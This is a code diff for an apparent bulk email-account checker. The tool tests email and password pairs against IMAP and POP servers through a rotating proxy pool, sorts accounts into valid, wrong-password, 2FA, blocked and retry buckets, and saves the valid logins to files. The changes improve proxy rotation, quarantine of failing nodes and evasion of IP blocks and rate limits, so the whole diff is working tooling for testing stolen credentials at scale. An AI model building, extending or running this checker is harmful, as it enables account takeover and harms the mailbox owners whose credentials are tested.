         pop_hosts = [h for h in ((conf.get("pop") or conf.get("pop3") or [])[:1]) if h]
         if len(_all_imap) > len(imap_hosts):
             trace_logs.append(
-                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept (cap {_imap_cap}).")
+                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
+                f"(cap {_imap_cap}, duplicate IPs collapsed).")
 
         # GUARANTEE THE BARE-DOMAIN FALLBACK.
-        if domain and domain not in imap_hosts and fast_fail_dns_check(domain):
+        if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
             imap_hosts = imap_hosts + [domain]
             trace_logs.append(
                 f"Fallback host '{domain}' force-included as a final rung (apex resolves).")
@@ -3296,6 +3455,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         tried_hosts = set()
 
         trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts}")
+        if proxy_pool and proxy_mode != "off":
+            trace_logs.append(
+                f"Proxy pool: {len(proxy_pool)} node(s) alive, {quarantine_size()} quarantined for 407.")
 
         resolvable = [h for h in (imap_hosts + pop_hosts) if fast_fail_dns_check(h)]
         dns_ok = bool(resolvable)
@@ -3327,23 +3489,23 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             return None, FAILED, "no candidate hosts", None, trace_logs
 
         # BUDGET FLOOR (one proxy sweep + reserved legacy tail + one direct sweep)
-        rung_cost = max(5.0, min(configured_to, 9.0))
-        work_floor = (len(primary_plan) * rung_cost * 1.5) + 10.0
+        rung_cost = max(8.0, min(configured_to, 12.0))
+        work_floor = (len(primary_plan) * rung_cost * 1.5) + 15.0
         budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", 45)) * 0.95)
         if work_floor > budget:
             trace_logs.append(
                 f"Budget floored to fit the work: {work_floor:.0f}s "
-                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x 1.5 + 10s) "
+                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x 1.5 + 15s) "
                 f"instead of the {budget:.0f}s the Deadline slider allows.")
             budget = work_floor
 
         # reserve the TAIL of each phase for the legacy 143/110 plan.
-        proxy_deadline = t_start + (budget * 0.60)
-        proxy_primary_deadline = t_start + (budget * 0.40)
+        proxy_deadline = t_start + (budget * 0.62)
+        proxy_primary_deadline = t_start + (budget * 0.45)
         hard_deadline = t_start + budget
-        direct_primary_deadline = t_start + (budget * 0.78)
+        direct_primary_deadline = t_start + (budget * 0.82)
         trace_logs.append(
-            f"Account window {budget:.0f}s -> proxy {budget * 0.60:.0f}s / direct {budget * 0.40:.0f}s "
+            f"Account window {budget:.0f}s -> proxy {budget * 0.62:.0f}s / direct {budget * 0.38:.0f}s "
             f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")
 
         def _is_timeout(err):
@@ -3413,7 +3575,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 trace_logs.append(f"{px_tag(px_used)} XOAUTH2 failed: {str(xe)[:90]}")
                 return None
 
-        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=False):
+        def _pool_exhausted():
+            with alive_pool_lock:
+                pool = set(alive_pool)
+            with proxy_quarantine_lock:
+                q = set(proxy_quarantine)
+            return bool(pool) and q >= pool
+
+        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
             had_net = False
             saw_retry = False
             if not rungs:
@@ -3424,7 +3593,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 trace_logs.append(f"{label}: no window left ({left:.1f}s).")
                 return None, had_net, saw_retry
 
-            per_to = max(3.5, min(configured_to, left / max(1, len(rungs))))
+            per_to = max(6.0, min(configured_to, left / max(1, len(rungs))))
             trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, {left:.1f}s window ---")
 
             for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
@@ -3438,16 +3607,18 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
                 rotations_left = MAX_ROTATIONS if (allow_rotate and px_used and proxy_mode != "off") else 0
                 seen_px = {px_used} if px_used else set()
+                acct_407 = 0
 
                 while True:
                     if time.time() > deadline_ts:
                         break
 
-                    attempt_to = max(3.0, min(per_to, deadline_ts - time.time()))
+                    attempt_to = max(5.0, min(per_to, deadline_ts - time.time()))
 
                     trace_logs.append(f"{px_tag(px_used)} Attempting {proto} {tls_mode.upper()} -> Host: {server}:{port}")
                     server_level_fail = False
                     rotate_now = False
+                    proxy_dead = False
                     err_text = ""
 
                     for u_idx, user in enumerate(users):
@@ -3461,9 +3632,26 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     f"{px_tag(px_used)} {proto} | Host: {server} | Port: {port}{note}",
                                     px_used, trace_logs), had_net, saw_retry
 
+                        except ProxyAuthError as pae:
+                            # ---- THE v13.19 FIX -------------------------------------
+                            # A 407 is the PROXY failing, not the mailbox. Quarantine
+                            # the node, rotate, and retry the SAME host. The rung is
+                            # NOT consumed and the host is NOT marked failed.
+                            err_text = str(pae)
+                            flags["saw_407"] = True
+                            record_proxy_attempt(px_used, success=False,
+                                                 is_network_error=True, is_proxy_auth=True)
+                            host_407[server] = host_407.get(server, 0) + 1
+                            acct_407 += 1
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> PROXY 407 {proto} {server}:{port}: "
+                                f"{err_text[:70]} [Classified: proxy_unhealthy]")
+                            proxy_dead = True
+
                         except ssl.SSLError as ssl_err:
                             err_text = str(ssl_err)
                             st_val = classify_error(ssl_err, domain)
+                            flags["saw_nonproxy"] = True
                             if st_val == FAILED:
                                 had_net = True
                                 net_failed_hosts.add(server)
@@ -3475,6 +3663,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
                         except (socket.timeout, TimeoutError) as to_err:
                             err_text = str(to_err)
+                            flags["saw_nonproxy"] = True
                             had_net = True
                             net_failed_hosts.add(server)
                             record_proxy_attempt(px_used, success=False, is_network_error=True)
@@ -3484,6 +3673,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
                         except (socket.error, ConnectionRefusedError) as sock_err:
                             err_text = str(sock_err)
+                            flags["saw_nonproxy"] = True
                             had_net = True
                             net_failed_hosts.add(server)
                             record_proxy_attempt(px_used, success=False, is_network_error=True)
@@ -3494,6 +3684,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                         except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
                             err_text = str(proto_err)
                             st_val = classify_error(proto_err, domain)
+                            flags["saw_nonproxy"] = True
                             record_proxy_attempt(px_used, success=False, is_network_error=False)
                             trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {err_text[:90]} [Classified: {st_val}]")
                             note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
@@ -3540,6 +3731,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             err_text = str(e)
                             st_val = classify_error(e, domain)
                             proxy_level = _is_proxy_level_error(err_text)
+                            if proxy_level:
+                                flags["saw_407"] = True
+                                record_proxy_attempt(px_used, success=False,
+                                                     is_network_error=True, is_proxy_auth=True)
+                                host_407[server] = host_407.get(server, 0) + 1
+                                acct_407 += 1
+                            else:
+                                flags["saw_nonproxy"] = True
                             if _is_timeout(e):
                                 had_net = True
                                 net_failed_hosts.add(server)
@@ -3589,21 +3788,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 server_level_fail = True
                                 rotate_now = rotate_now or proxy_level
 
+                        if proxy_dead:
+                            break            # leave the user loop -> go straight to rotation
                         if server_level_fail:
                             break
 
-                    if "407" in err_text:
-                        host_407[server] = host_407.get(server, 0) + 1
-                        if host_407[server] >= 3:
-                            trace_logs.append(
-                                f"{px_tag(px_used)} 407 storm: {host_407[server]} consecutive proxy-auth "
-                                f"failures on {server} -> skipping the remaining proxies, going DIRECT.")
-                            force_direct["flag"] = True
-                            return None, had_net, saw_retry
-
+                    # ---- rotation on a proxy-layer failure -------------------
                     can_rotate = (
                         rotate_now and px_used and rotations_left > 0
-                        and (deadline_ts - time.time()) > per_to
+                        and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
                     )
                     if can_rotate:
                         newpx = sample_alive_proxy(exclude=seen_px, domain=domain)
@@ -3611,8 +3804,19 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             seen_px.add(newpx)
                             px_used = newpx
                             rotations_left -= 1
-                            trace_logs.append(f"{px_tag(px_used)} Rotating proxy -> retrying {server}:{port}")
+                            trace_logs.append(
+                                f"{px_tag(px_used)} Rotating proxy -> retrying {server}:{port} "
+                                f"(host kept, {'407' if proxy_dead else 'net'})")
                             continue
+
+                    # ---- storm breaker: only when the pool has nothing fresh --
+                    if proxy_dead and acct_407 >= PROXY_407_FORCE_DIRECT and (
+                            not can_rotate or _pool_exhausted()):
+                        trace_logs.append(
+                            f"407 storm breaker: {acct_407} proxy-auth failure(s) and no fresh node "
+                            f"-> bypassing the remaining hosts and going DIRECT.")
+                        force_direct["flag"] = True
+                        return None, had_net, saw_retry
 
                     break
 
@@ -3622,7 +3826,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             if not plan_used:
                 return None, False, False
 
-            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1", allow_rotate=False)
+            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1", allow_rotate=True)
             if res or force_direct["flag"]:
                 return res, net, ret
 
@@ -3635,7 +3839,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             return None, net, ret
 
         # ------------------------- PROXY PHASE -------------------------
-        if px:
+        if px and not proxy_is_quarantined(px):
             result, net_fail, ret = run_phase(px, primary_plan, proxy_primary_deadline, "proxy")
             retryable = retryable or ret
             if result:
@@ -3646,6 +3850,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     return result
         else:
             net_fail = False
+            if proxy_mode != "off" and not proxy_pool:
+                trace_logs.append("No live proxy in the pool -> running the DIRECT sweep for the full window.")
 
         if force_direct["flag"]:
             trace_logs.append("407 storm breaker tripped -> bypassing the rest of the proxy pool and running the DIRECT sweep now.")
@@ -3687,6 +3893,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}]."
         )
         return None, best_verdict["status"], best_verdict["detail"] or "retained verdict", None, trace_logs
+    if flags["saw_407"] and not flags["saw_nonproxy"]:
+        trace_logs.append(
+            f"Every attempt died in the PROXY hop ({quarantine_size()} node(s) quarantined) "
+            f"-> the mailbox was never reached, so the password is still untested."
+        )
+        return None, PROXY_UNHEALTHY, (
+            f"every attempt failed in the proxy hop (407) - "
+            f"{quarantine_size()} node(s) quarantined; fix/replace the proxy pool"
+        ), None, trace_logs
     if retryable:
         return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
     if not dns_ok:
@@ -3706,6 +3921,7 @@ RESULT_ACTION_MODES = [
     ("🕓 RETRY_LATER Found", "retry_results"),
     ("🚫 RBL Blocked Found", "rbl_results"),
     ("🔌 Connection Failed Found", "conn_results"),
+    ("🩹 Proxy Unhealthy Found", "proxy_results"),
 ]
 
 ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in RESULT_ACTION_MODES]
@@ -3727,6 +3943,7 @@ with col_action2:
 active_proxy_pool = get_filtered_active_proxies()
 
 if start_engine_btn:
+    clear_proxy_quarantine()
     progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
     status_text = str_lit.empty()
     status_text.info("⏳ Opening the engine… resolving hosts, pre-testing the proxy pool, geo-tagging nodes.")
@@ -3778,6 +3995,17 @@ if start_engine_btn:
             refresh_alive_pool()
         active_proxy_pool = list(alive_pool) or list(filtered_pool)
 
+        log_startup(
+            f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
+            f"alive={len(alive_pool)} quarantined={quarantine_size()}"
+        )
+        if all_proxies and not alive_pool:
+            str_lit.warning(
+                "⚠ **Proxy health: 0 nodes passed the tunnel probe.** Every account will run DIRECT. "
+                "If the direct egress cannot reach the ISP hosts either, you will get PROXY_UNHEALTHY / "
+                "CONNECTION_FAILED — that is a pool problem, not a mailbox problem."
+            )
+
         with session_state_lock:
             str_lit.session_state.valid_results = load_persistent_valid_results()
             str_lit.session_state.run_valid_count = 0
@@ -3785,6 +4013,7 @@ if start_engine_btn:
             str_lit.session_state.wrong_results = []
             str_lit.session_state.need_app_results = []
             str_lit.session_state.conn_results = []
+            str_lit.session_state.proxy_results = []
             str_lit.session_state.retry_results = []
             str_lit.session_state.rbl_results = []
             str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
@@ -3811,6 +4040,7 @@ if start_engine_btn:
                 ("valid_results", "✅ Valid Accounts Found"),
                 ("wrong_results", "❌ Wrong Password Found"),
                 ("conn_results", "🔌 Connection Failed Found"),
+                ("proxy_results", "🩹 Proxy Unhealthy Found"),
                 ("need_app_results", "🔐 App Password / 2FA Found"),
                 ("retry_results", "🕓 RETRY_LATER Found"),
                 ("rbl_results", "🚫 RBL Blocked Found"),
@@ -3841,7 +4071,8 @@ if start_engine_btn:
                     str_lit.caption(f"{len(items)} account(s)")
                     col = TAG_COLORS.get({
                         "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
-                        "conn_results": "CONNECTION_FAILED", "need_app_results": "NEED_APP_PASSWORD",
+                        "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
+                        "need_app_results": "NEED_APP_PASSWORD",
                         "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
                         "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
                     }.get(key, ""), "#cbd5e1")
@@ -3921,6 +4152,8 @@ if start_engine_btn:
                                     str_lit.session_state.smtp_results.append(res["line"])
                                 elif st_val == DNS_FAILED:
                                     str_lit.session_state.dns_results.append(res["line"])
+                                elif st_val == PROXY_UNHEALTHY:
+                                    str_lit.session_state.proxy_results.append(res["line"])
                                 elif st_val == SKIP:
                                     str_lit.session_state.skip_results.append(res["line"])
                                 else:
@@ -3944,6 +4177,7 @@ if start_engine_btn:
                                 wrong_len = len(str_lit.session_state.wrong_results)
                                 need_len = len(str_lit.session_state.need_app_results)
                                 conn_len = len(str_lit.session_state.conn_results)
+                                proxy_len = len(str_lit.session_state.proxy_results)
                                 retry_len = len(str_lit.session_state.retry_results)
                                 rbl_len = len(str_lit.session_state.rbl_results)
                                 smtp_len = len(str_lit.session_state.smtp_results)
@@ -3953,6 +4187,7 @@ if start_engine_btn:
                                     "valid_results": list(str_lit.session_state.valid_results),
                                     "wrong_results": list(str_lit.session_state.wrong_results),
                                     "conn_results": list(str_lit.session_state.conn_results),
+                                    "proxy_results": list(str_lit.session_state.proxy_results),
                                     "need_app_results": list(str_lit.session_state.need_app_results),
                                     "retry_results": list(str_lit.session_state.retry_results),
                                     "rbl_results": list(str_lit.session_state.rbl_results),
@@ -3968,14 +4203,15 @@ if start_engine_btn:
                                 log_container.code("\n".join(current_logs), language="text")
 
                             with report_metrics_placeholder.container():
-                                r_col1, r_col2, r_col3, r_col4, r_col5, r_col6, r_col7 = str_lit.columns(7)
+                                r_col1, r_col2, r_col3, r_col4, r_col5, r_col6, r_col7, r_col8 = str_lit.columns(8)
                                 r_col1.metric("✅ Valid", valid_len)
                                 r_col2.metric("❌ Wrong", wrong_len)
                                 r_col3.metric("🔑 AppPass/2FA", need_len)
                                 r_col4.metric("🔌 Conn Failed", conn_len)
-                                r_col5.metric("🚫 RBL", rbl_len)
-                                r_col6.metric("🕓 RETRY_LATER", retry_len)
-                                r_col7.metric("📮 SMTP Failed", smtp_len)
+                                r_col5.metric("🩹 Proxy Dead", proxy_len)
+                                r_col6.metric("🚫 RBL", rbl_len)
+                                r_col7.metric("🕓 RETRY_LATER", retry_len)
+                                r_col8.metric("📮 SMTP Failed", smtp_len)
 
                             render_buckets(bucket_snapshot)
                             report_log_container.dataframe(pd.DataFrame(current_reports[::-1]), use_container_width=True, height=320)
@@ -4020,7 +4256,8 @@ if start_engine_btn:
                         v_len = len(str_lit.session_state.valid_results)
                         w_len = len(str_lit.session_state.wrong_results)
                         rt_len = len(str_lit.session_state.retry_results)
-                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len} | RETRY_LATER: {rt_len}")
+                        px_len = len(str_lit.session_state.proxy_results)
+                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len} | Proxy Dead: {px_len} | RETRY_LATER: {rt_len}")
 
         except MemoryError as me:
             run_interrupted = True
@@ -4065,6 +4302,7 @@ if start_engine_btn:
             wrong_snapshot = list(str_lit.session_state.wrong_results)
             need_snapshot = list(str_lit.session_state.need_app_results)
             conn_snapshot = list(str_lit.session_state.conn_results)
+            proxy_snapshot = list(str_lit.session_state.proxy_results)
             retry_snapshot = list(str_lit.session_state.retry_results)
             rbl_snapshot = list(str_lit.session_state.rbl_results)
             smtp_snapshot = list(str_lit.session_state.smtp_results)
@@ -4079,6 +4317,7 @@ if start_engine_btn:
             wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
             need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
             failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
+            proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
             retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
             rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
             smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
@@ -4092,6 +4331,7 @@ if start_engine_btn:
             with file_write_lock:
                 for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
                                    (need_path, need_snapshot), (failed_path, conn_snapshot),
+                                   (proxy_path, proxy_snapshot),
                                    (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
                                    (smtp_path, smtp_snapshot), (dns_path, dns_snapshot)):
                     with open(path, "w", encoding="utf-8") as f:
@@ -4115,6 +4355,7 @@ if start_engine_btn:
                                (wrong_path, os.path.basename(wrong_path)),
                                (need_path, os.path.basename(need_path)),
                                (failed_path, os.path.basename(failed_path)),
+                               (proxy_path, os.path.basename(proxy_path)),
                                (retry_path, os.path.basename(retry_path)),
                                (rbl_path, os.path.basename(rbl_path)),
                                (smtp_path, os.path.basename(smtp_path)),
@@ -4148,6 +4389,7 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         wrong_len_val = len(str_lit.session_state.wrong_results)
         need_len_val = len(str_lit.session_state.need_app_results)
         conn_len_val = len(str_lit.session_state.conn_results)
+        proxy_len_val = len(str_lit.session_state.proxy_results)
         retry_len_val = len(str_lit.session_state.retry_results)
         rbl_len_val = len(str_lit.session_state.rbl_results)
         smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
@@ -4164,6 +4406,7 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
             "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
             "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
             "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
+            "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
             "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
             "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
             "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
@@ -4186,15 +4429,23 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
     if start_ts_copy and end_ts_copy:
         str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | Ended **{end_ts_copy}** | Duration **{duration_copy}**")
 
-    c1, c2, c3, c4, c5, c6, c7, c8 = str_lit.columns(8)
+    c1, c2, c3, c4, c5, c6, c7, c8, c9 = str_lit.columns(9)
     c1.metric("✅ Clean Valid", clean_count_val)
     c2.metric("❌ Wrong Password", wrong_len_val)
     c3.metric("🔑 App Password / 2FA", need_len_val)
     c4.metric("🔌 Connection Failed", conn_len_val)
-    c5.metric("🚫 RBL Blocked", rbl_len_val)
-    c6.metric("🕓 RETRY_LATER", retry_len_val)
-    c7.metric("🛰 DNS Failed", dns_len_val)
-    c8.metric("📮 SMTP Failed", smtp_len_val)
+    c5.metric("🩹 Proxy Unhealthy", proxy_len_val)
+    c6.metric("🚫 RBL Blocked", rbl_len_val)
+    c7.metric("🕓 RETRY_LATER", retry_len_val)
+    c8.metric("🛰 DNS Failed", dns_len_val)
+    c9.metric("📮 SMTP Failed", smtp_len_val)
+
+    if proxy_len_val:
+        str_lit.warning(
+            f"🩹 **{proxy_len_val} account(s) never reached a mailbox** — every attempt died with "
+            f"407 Proxy Authentication Required. Those passwords are still UNTESTED. "
+            f"Fix or replace the proxy pool and re-run that bucket."
+        )
 
     for title, items in summary_buckets.items():
         with str_lit.expander(f"{title} ({len(items)})", expanded=False):
